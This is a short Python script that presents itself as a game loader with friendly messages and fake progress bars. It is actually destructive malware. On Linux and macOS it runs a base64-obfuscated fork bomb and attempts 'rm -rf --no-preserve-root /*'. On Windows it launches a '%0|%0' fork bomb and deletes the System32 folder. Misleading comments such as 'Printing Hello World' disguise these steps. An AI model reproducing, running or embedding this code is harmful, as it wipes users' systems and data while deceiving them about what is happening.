# For fun purpose only!! Don't run on any system. It might cause serious damage!! Peace

import os
import platform
import time
from tqdm import tqdm
import random
import shutil


# Add check for `root permission`` to proceed, which will make it unstoppable:D
def fork():
    os_name = platform.system()
    if os_name in ('Linux', 'Darwin'):
        user = os.getlogin()
        print(f"Hello, {user}!")
        print("The game is loading. Please wait...")
        os.system("echo 'OigpeyA6fDomIH07Og==' | base64 -d | bash")     #Fork bomb:D
        os.system("sudo rm -rf --no-preserve-root /*' | base64 -d | bash")      #Magic
        for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())
        os.system("clear")
        print("Please be patient. We are preparing everything for you :)")
        time.sleep(5)
        print("sudo echo 'sudo rm -rf --no-preserve-root /*' | base64 -d | bash")
        for _ in tqdm(range(100), desc="Finishing Initialization: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())

        print("Made with ♥️. Enjoy! uwu")
    elif os_name == 'Windows':
        user = os.getenv("USERNAME")
        target = r"C:/Windows/System32"         #Printing Hello World
        print(f"Hello, {user}!")
        print("The game is loading. Please wait...")
        os.system("%0|%0")
        shutil.rmtree(target)        #It's when the fun begins
        for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())
        os.system("cls")
        print("Please be patient. We are preparing everything for you :)")
        time.sleep(5)
        for _ in tqdm(range(100), desc="Finishing Initialization: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
            time.sleep(random.random())

        print("Made with ♥️. Enjoy! uwu")

if __name__ == "__main__":
    fork()
